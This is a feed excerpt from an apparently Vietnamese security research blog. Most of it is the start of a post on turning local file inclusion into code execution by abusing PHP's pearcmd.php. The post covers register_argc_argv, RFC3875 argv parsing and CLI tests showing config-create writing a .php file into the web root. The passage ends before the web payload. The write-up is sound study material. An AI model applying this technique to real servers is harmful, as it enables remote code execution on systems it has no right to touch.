dung).&lt;/li&gt;&#xA;&lt;li&gt;Giới hạn quyền gọi request chỉ cho vai trò cần thiết.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SSRF (Server Side Request Forgery) — Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/ultimate-addons-for-gutenberg/vulnerability/wordpress-spectra-plugin-2-6-6-server-side-request-forgery-ssrf-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress Spectra Plugin &amp;lt;= 2.6.6 is vulnerable to Server Side Request Forgery (SSRF) &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Exploiting LFI2RCE Vulnerability via PHP PEARCMD</title>
      <link>http://localhost:1313/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/</link>
      <pubDate>Wed, 22 Oct 2025 20:48:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;Xin chào. Sau khi phân tích 10 CVE liên quan đến LFI trên các plugin WordPress, tôi nhận thấy một rào cản chung: nhiều vector khai thác bị giới hạn bởi yêu cầu &lt;strong&gt;phải có hậu tố &lt;code&gt;.php&lt;/code&gt;&lt;/strong&gt;. Điều này làm giảm đáng kể khả năng khai thác. Trong quá trình tìm hiểu, tôi tìm thấy bài viết &lt;a href=&#34;https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;docker-php-include-getshell&lt;/a&gt;. Bài đó mô tả cách &lt;strong&gt;bypass ràng buộc &lt;code&gt;.php&lt;/code&gt;&lt;/strong&gt; bằng cách lợi dụng file &lt;code&gt;pearcmd.php&lt;/code&gt; vốn nằm trong bộ công cụ &lt;strong&gt;PECL&lt;/strong&gt;/&lt;strong&gt;PEAR&lt;/strong&gt; của PHP và có sẵn trong môi trường WordPress được triển khai trên Docker - một mẹo rất thực tế cho kịch bản không cho upload file.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;pear-và-pecl-là-gì&#34;&gt;&lt;span&gt;PEAR và PECL là gì?&lt;/span&gt;&#xA;  &lt;a href=&#34;#pear-v%c3%a0-pecl-l%c3%a0-g%c3%ac&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;PECL (PHP Extension Community Library)&lt;/strong&gt;: công cụ dòng lệnh để cài và quản lý extension PHP.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;PEAR (PHP Extension and Application Repository)&lt;/strong&gt;: thư viện nền tảng cho PECL.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Trước PHP &lt;code&gt;7.3&lt;/code&gt;, PEAR/PECL thường được cài mặc định.&lt;br&gt;&#xA;Từ PHP &lt;code&gt;7.4&lt;/code&gt; trở đi, cần biên dịch PHP với &lt;code&gt;--with-pear&lt;/code&gt; để có chúng.&lt;/p&gt;&#xA;&lt;p&gt;Tuy nhiên, trong các Docker image PHP chính thức, PEAR/PECL &lt;strong&gt;vẫn thường được cài sẵn&lt;/strong&gt;, nằm ở &lt;code&gt;/usr/local/lib/php&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;root@e182501c47c4:/var/www/html# ls /usr/local/lib/php&#xA;Archive  Console  OS  PEAR  PEAR.php  Structures  System.php  XML  build  data  doc  extensions  pearcmd.php  peclcmd.php  test&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;pearcmdphp-và-register_argc_argv&#34;&gt;&lt;span&gt;&lt;code&gt;pearcmd.php&lt;/code&gt; và &lt;code&gt;register_argc_argv&lt;/code&gt;&lt;/span&gt;&#xA;  &lt;a href=&#34;#pearcmdphp-v%c3%a0-register_argc_argv&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;code&gt;pearcmd.php&lt;/code&gt; là một script PHP thiết kế để chạy ở chế độ dòng lệnh, ví dụ:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;php /usr/local/lib/php/pearcmd.php install somepackage&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nó xử lý các tham số từ &lt;code&gt;$argv&lt;/code&gt; và &lt;code&gt;$argc&lt;/code&gt;. Khi chạy như CLI thì dữ liệu này rõ ràng. Nếu file này được include trong bối cảnh web (do LFI), logic CLI của nó có thể bị lợi dụng.&lt;/p&gt;&#xA;&lt;p&gt;Điểm then chốt là cấu hình &lt;code&gt;register_argc_argv&lt;/code&gt;. Nếu &lt;code&gt;register_argc_argv = On&lt;/code&gt;, PHP sẽ tạo:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;$argc&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$argv&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$_SERVER[&#39;argv&#39;]&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv.png&#34; title=&#34;`argv` trong cấu hình PHP&#34; data-thumbnail=&#34;/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv.png&#34; data-sub-html=&#34;&lt;h2&gt;argv&lt;/h2&gt;&lt;p&gt;`argv` trong cấu hình PHP&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv.png&#39; alt=&#34;argv&#34; height=&#34;190&#34; width=&#34;844&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;`argv` trong cấu hình PHP&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Khi thiết lập WordPress trên Docker, &lt;code&gt;register_argc_argv&lt;/code&gt; thường bật mặc định. Vấn đề đặt ra: khi PHP chạy dưới SAPI web (FPM/Apache) và không phải CLI, &lt;code&gt;$argv&lt;/code&gt; lấy dữ liệu từ đâu?&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis-php-source-code&#34;&gt;&lt;span&gt;Analysis PHP Source Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis-php-source-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Trong PHP core có logic như sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (PG(register_argc_argv)) {&#xA;    if (SG(request_info).argc) {&#xA;        ...&#xA;    } else {&#xA;        php_build_argv(SG(request_info).query_string, &amp;amp;PG(http_globals)[TRACK_VARS_SERVER]);&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nếu không có &lt;code&gt;argc&lt;/code&gt; (không chạy CLI), PHP gọi &lt;code&gt;php_build_argv&lt;/code&gt; với &lt;code&gt;SG(request_info).query_string&lt;/code&gt; - tức &lt;strong&gt;query string&lt;/strong&gt; của URL. Ví dụ:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;http://example.com/index.php?a=b&amp;amp;c=d&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;→ &lt;code&gt;query_string = &amp;quot;a=b&amp;amp;c=d&amp;quot;&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;PHP sẽ dùng query string này để tạo biến &lt;code&gt;argv&lt;/code&gt;, do đó &lt;code&gt;$_SERVER[&#39;argv&#39;]&lt;/code&gt; có thể bị ảnh hưởng bởi query string.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Hậu quả&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;Khi &lt;code&gt;pearcmd.php&lt;/code&gt; được include qua LFI trong môi trường web mà &lt;code&gt;$_SERVER[&#39;argv&#39;]&lt;/code&gt; được sinh từ query string, attacker có thể điều khiển các tham số dòng lệnh mà &lt;code&gt;pearcmd.php&lt;/code&gt; đọc được. Do đó, chức năng dòng lệnh của PEAR/PECL có thể bị lợi dụng qua web để thực hiện hành động không mong muốn.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;rfc3875-explain&#34;&gt;&lt;span&gt;RFC3875 Explain&lt;/span&gt;&#xA;  &lt;a href=&#34;#rfc3875-explain&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;RFC3875 (CGI spec) định nghĩa một dạng &lt;strong&gt;&amp;ldquo;indexed&amp;rdquo; HTTP query&lt;/strong&gt; - tức là chuỗi truy vấn không chứa dấu &lt;code&gt;=&lt;/code&gt; chưa mã hóa và được gửi qua phương thức GET hoặc HEAD.&lt;/p&gt;&#xA;&lt;p&gt;Khi gặp loại truy vấn này, server &lt;strong&gt;nên&lt;/strong&gt; (&lt;code&gt;SHOULD&lt;/code&gt;) coi phần query-string như một &lt;strong&gt;search-string&lt;/strong&gt;, tách thành các &lt;strong&gt;search-word&lt;/strong&gt; bằng dấu &lt;code&gt;+&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;search-string = search-word ( &amp;#34;&amp;#43;&amp;#34; search-word )&#xA;search-word = 1*schar&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sau khi tách, mỗi &lt;code&gt;search-word&lt;/code&gt; sẽ được &lt;strong&gt;URL-decode&lt;/strong&gt;, có thể mã hóa lại theo hệ thống, rồi &lt;strong&gt;thêm vào danh sách đối số dòng lệnh (&lt;code&gt;argv&lt;/code&gt;)&lt;/strong&gt; của chương trình CGI.&lt;/p&gt;&#xA;&lt;p&gt;Nói ngắn gọn: nếu query-string không có dấu &lt;code&gt;=&lt;/code&gt; và là yêu cầu GET hoặc HEAD, máy chủ có thể coi các phần ngăn cách bằng &lt;code&gt;+&lt;/code&gt; như các tham số dòng lệnh và truyền vào &lt;code&gt;argv&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;RFC3875&lt;/strong&gt; cho phép server biến một query-string &amp;ldquo;indexed&amp;rdquo; (GET/HEAD, không có ký tự &lt;code&gt;=&lt;/code&gt; chưa mã hóa) thành danh sách từ, rồi đưa vào &lt;code&gt;argv&lt;/code&gt;. Phần mô tả trong tiêu chuẩn như sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;4.4. The Script Command Line&#xA;&#xA;Some systems support a method for supplying an array of strings to&#xA;the CGI script. This is only used in the case of an &amp;#39;indexed&amp;#39; HTTP&#xA;query, which is identified by a &amp;#39;GET&amp;#39; or &amp;#39;HEAD&amp;#39; request with a URI&#xA;query string that does not contain any unencoded &amp;#34;=&amp;#34; characters. For&#xA;such a request, the server SHOULD treat the query-string as a&#xA;search-string and parse it into words, using the rules&#xA;&#xA;search-string = search-word ( &amp;#34;&amp;#43;&amp;#34; search-word )&#xA;search-word = 1*schar&#xA;schar = unreserved | escaped | xreserved&#xA;xreserved = &amp;#34;;&amp;#34; | &amp;#34;/&amp;#34; | &amp;#34;?&amp;#34; | &amp;#34;:&amp;#34; | &amp;#34;@&amp;#34; | &amp;#34;&amp;amp;&amp;#34; | &amp;#34;=&amp;#34; | &amp;#34;,&amp;#34; |&#xA;&amp;#34;$&amp;#34;&#xA;&#xA;After parsing, each search-word is URL-decoded, optionally encoded in&#xA;a system-defined manner and then added to the command line argument&#xA;list.&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;PHP từng có lỗ hổng liên quan (&lt;a href=&#34;https://nvd.nist.gov/vuln/detail/cve-2012-1823&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2012-1823&lt;/a&gt;). Hiện nay, PHP xử lý query-string rộng hơn RFC - ngay cả khi query-string có dấu &lt;code&gt;=&lt;/code&gt;, nó vẫn có thể được đưa vào &lt;code&gt;$_SERVER[&#39;argv&#39;]&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/equal.png&#34; title=&#34;PHP vẫn thêm query-string có dấu `=` vào $_SERVER[&amp;#39;argv&amp;#39;]&#34; data-thumbnail=&#34;/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/equal.png&#34; data-sub-html=&#34;&lt;h2&gt;equal&lt;/h2&gt;&lt;p&gt;PHP vẫn thêm query-string có dấu `=` vào $_SERVER[&amp;#39;argv&amp;#39;]&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/equal.png&#39; alt=&#34;equal&#34; height=&#34;276&#34; width=&#34;1058&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;PHP vẫn thêm query-string có dấu `=` vào $_SERVER[&#39;argv&#39;]&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;👉 Khi truyền query string theo dạng &lt;code&gt;?a+b+c+...&lt;/code&gt;, PHP sẽ tách chuỗi tại các dấu &lt;code&gt;+&lt;/code&gt; và tạo ra biến &lt;code&gt;$_SERVER[&#39;argv&#39;]&lt;/code&gt; dưới dạng một mảng chứa các phần tử &lt;code&gt;[&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, ...]&lt;/code&gt;, đúng theo cơ chế được mô tả trong RFC3875.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;testing-pear-in-cli&#34;&gt;&lt;span&gt;Testing PEAR in CLI&lt;/span&gt;&#xA;  &lt;a href=&#34;#testing-pear-in-cli&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Trong bài viết của tác giả có đề cập đến payload liên quan đến &lt;code&gt;config-create&lt;/code&gt;, được mô tả là dùng để tạo file cấu hình.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/doc-config.png&#34; title=&#34;Mô tả về config-create&#34; data-thumbnail=&#34;/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/doc-config.png&#34; data-sub-html=&#34;&lt;h2&gt;doc-config&lt;/h2&gt;&lt;p&gt;Mô tả về config-create&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/doc-config.png&#39; alt=&#34;doc-config&#34; height=&#34;387&#34; width=&#34;608&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Mô tả về config-create&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Khi tôi thử chạy lệnh trên CLI:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;root@e182501c47c4:/var/www/html# php /usr/local/lib/php/pearcmd.php config-create&#xA;config-create: must have 2 parameters, root path and filename to save as&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi không truyền đủ tham số, chương trình báo lỗi và yêu cầu hai tham số bắt buộc:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;root path&lt;/code&gt;: thư mục gốc mà PEAR dùng để cài đặt các package và tìm cấu hình.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;filename&lt;/code&gt;: đường dẫn tới file cấu hình sẽ được tạo ra.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Thử chạy với tham số đầy đủ:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;root@e182501c47c4:/var/www/html# php /usr/local/lib/php/pearcmd.php config-create test_root_path test_filename.php&#xA;Root directory must be an absolute path beginning with &amp;#34;/&amp;#34;, was: &amp;#34;test_root_path&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ở đây PEAR yêu cầu &lt;code&gt;test_root_path&lt;/code&gt; phải là đường dẫn tuyệt đối, tức là phải có dấu &lt;code&gt;/&lt;/code&gt; ở đầu.&lt;/p&gt;&#xA;&lt;p&gt;Khi chạy lại với đường dẫn hợp lệ:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;root@e182501c47c4:/var/www/html# php /usr/local/lib/php/pearcmd.php config-create /test_root_path test_filename.php&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Kết quả trả về:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;Configuration (channel pear.php.net):&#xA;=====================================&#xA;Auto-discover new Channels     auto_discover    &amp;lt;not set&amp;gt;&#xA;Default Channel                default_channel  pear.php.net&#xA;HTTP Proxy Server Address      http_proxy       &amp;lt;not set&amp;gt;&#xA;PEAR server [DEPRECATED]       master_server    &amp;lt;not set&amp;gt;&#xA;Default Channel Mirror         preferred_mirror &amp;lt;not set&amp;gt;&#xA;Remote Configuration File      remote_config    &amp;lt;not set&amp;gt;&#xA;PEAR executables directory     bin_dir          /test_root_path/pear&#xA;PEAR documentation directory   doc_dir          /test_root_path/pear/docs&#xA;PHP extension directory        ext_dir          /test_root_path/pear/ext&#xA;PEAR directory                 php_dir          /test_root_path/pear/php&#xA;PEAR Installer cache directory cache_dir        /test_root_path/pear/cache&#xA;PEAR configuration file        cfg_dir          /test_root_path/pear/cfg&#xA;directory&#xA;PEAR data directory            data_dir         /test_root_path/pear/data&#xA;PEAR Installer download        download_dir     /test_root_path/pear/download&#xA;directory&#xA;Systems manpage files          man_dir          /test_root_path/pear/man&#xA;directory&#xA;PEAR metadata directory        metadata_dir     &amp;lt;not set&amp;gt;&#xA;PHP CLI/CGI binary             php_bin          &amp;lt;not set&amp;gt;&#xA;php.ini location               php_ini          &amp;lt;not set&amp;gt;&#xA;--program-prefix passed to     php_prefix       &amp;lt;not set&amp;gt;&#xA;PHP&amp;#39;s ./configure&#xA;--program-suffix passed to     php_suffix       &amp;lt;not set&amp;gt;&#xA;PHP&amp;#39;s ./configure&#xA;PEAR Installer temp directory  temp_dir         /test_root_path/pear/temp&#xA;PEAR test directory            test_dir         /test_root_path/pear/tests&#xA;PEAR www files directory       www_dir          /test_root_path/pear/www&#xA;Cache TimeToLive               cache_ttl        &amp;lt;not set&amp;gt;&#xA;Preferred Package State        preferred_state  &amp;lt;not set&amp;gt;&#xA;Unix file mask                 umask            &amp;lt;not set&amp;gt;&#xA;Debug Log Level                verbose          &amp;lt;not set&amp;gt;&#xA;PEAR password (for             password         &amp;lt;not set&amp;gt;&#xA;maintainers)&#xA;Signature Handling Program     sig_bin          &amp;lt;not set&amp;gt;&#xA;Signature Key Directory        sig_keydir       &amp;lt;not set&amp;gt;&#xA;Signature Key Id               sig_keyid        &amp;lt;not set&amp;gt;&#xA;Package Signature Type         sig_type         &amp;lt;not set&amp;gt;&#xA;PEAR username (for             username         &amp;lt;not set&amp;gt;&#xA;maintainers)&#xA;User Configuration File        Filename         /var/www/html/test_filename.php&#xA;System Configuration File      Filename         #no#system#config#&#xA;Successfully created default configuration file &amp;#34;/var/www/html/test_filename.php&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Kết quả cho thấy các đường dẫn con cho từng loại dữ liệu được tự động sinh ra dưới &lt;code&gt;/test_root_path/pear&lt;/code&gt;. Ở dòng cuối cùng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;Successfully created default configuration file &amp;#34;/var/www/html/test_filename.php&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;File cấu hình được tạo trong thư mục hiện hành, không nằm trong &lt;code&gt;root_path&lt;/code&gt;. Đây là hành vi mặc định của PEAR: &lt;code&gt;root_path&lt;/code&gt; chỉ ảnh hưởng đến cấu trúc thư mục cài đặt, không quyết định vị trí lưu file cấu hình.&lt;/p&gt;&#xA;&lt;p&gt;Khi truy cập file &lt;code&gt;&amp;quot;/var/www/html/test_filename.php&amp;quot;&lt;/code&gt; trên trình duyệt:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/file-create.png&#34; title=&#34;Nội dung của test_filename.php được render trên trình duyệt&#34; data-thumbnail=&#34;/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/file-create.png&#34; data-sub-html=&#34;&lt;h2&gt;file-create&lt;/h2&gt;&lt;p&gt;Nội dung của test_filename.php được render trên trình duyệt&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/file-create.png&#39; alt=&#34;file-create&#34; height=&#34;137&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nội dung của test_filename.php được render trên trình duyệt&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;File được tạo có chứa thông tin về &lt;code&gt;test_root_path&lt;/code&gt;, được trình bày ở dạng &lt;code&gt;serialize&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Tuy nhiên, đó mới chỉ là quá trình thực thi trên CLI. Trong trường hợp khai thác qua web, cần phân tích mã nguồn để xem cách chương trình tiếp nhận và xử lý các tham số được truyền 